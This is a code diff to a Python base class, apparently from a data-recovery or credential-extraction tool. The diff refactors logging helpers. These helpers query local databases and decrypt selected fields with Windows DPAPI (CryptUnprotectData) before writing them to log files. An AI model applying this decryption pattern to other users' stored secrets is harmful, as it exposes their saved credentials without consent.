@@ -34,7 +34,7 @@ class Module:
 		self.logfile = os.path.abspath(file).replace(
 			os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
 			os.path.dirname(os.path.dirname(os.path.abspath(__file__))) + '/' + config.LOG_DIR + '/' + CURRENT_TIME,
-		).replace('.py', '.txt')
+		).replace('.py', '')
 
 	def init(self):
 		if self.enable:
@@ -109,7 +109,7 @@ class Module:
 		else:
 			self.log('Module ' + self.name + ' could not be correctly executed.', verbose=verbose, write=write, forceprint=not write)
 
-	def cursor_get_and_log(self, cursor, elements, db_name, decrypt_ids=None, write=True):
+	def cursor_get_and_log(self, cursor, elements, db_name, decrypt_ids=None, **other):
 		try:
 			cursor.execute(
 				'SELECT ' + elements + ' FROM ' + db_name)
@@ -117,11 +117,11 @@ class Module:
 			self.executenot(db_name + ' database is locked', 1)
 			return False
 
-		self.standard_multiple_log(cursor.fetchall(), header=elements, decrypt_ids=decrypt_ids, write=write)
+		self.standard_multiple_log(cursor.fetchall(), header=elements, decrypt_ids=decrypt_ids, **other)
 
-	def standard_multiple_log(self, content, header=None, decrypt_ids=None, write=True):
+	def standard_multiple_log(self, content, header=None, decrypt_ids=None, **other):
 		if header and (content or config.VERBOSE_LEVEL == 2):
-			self.log(header)
+			self.log(header, **other)
 		for el in content:
 			res = ''
 			for i in range(len(el)):
@@ -129,9 +129,9 @@ class Module:
 					res += ',' + (win32crypt.CryptUnprotectData(el[i], None, None, None, 0)[1]).decode('utf-8')
 				else:
 					res += ',' + str(el[i])
-			self.log(res[1:], write=write, forceprint=not write)
+			self.log(res[1:], **other)
 
-	def log(self, text, verbose=1, write=True, forceprint=False):
+	def log(self, text, verbose=1, spe=None, write=True, forceprint=False):
 		if verbose <= config.VERBOSE_LEVEL:
 			if config.LOG_TYPE == 0 or config.LOG_TYPE == 2 or forceprint:
 				print(str(text))
@@ -139,5 +139,5 @@ class Module:
 				if not os.path.isdir(os.path.dirname(self.logfile)):
 					os.makedirs(os.path.dirname(self.logfile))
 
-				with open(self.logfile, 'a', encoding='utf-8') as file:
+				with open(self.logfile + ('.' + spe if spe else '') + '.txt', 'a', encoding='utf-8') as file:
 					file.write(str(text) + '\n')
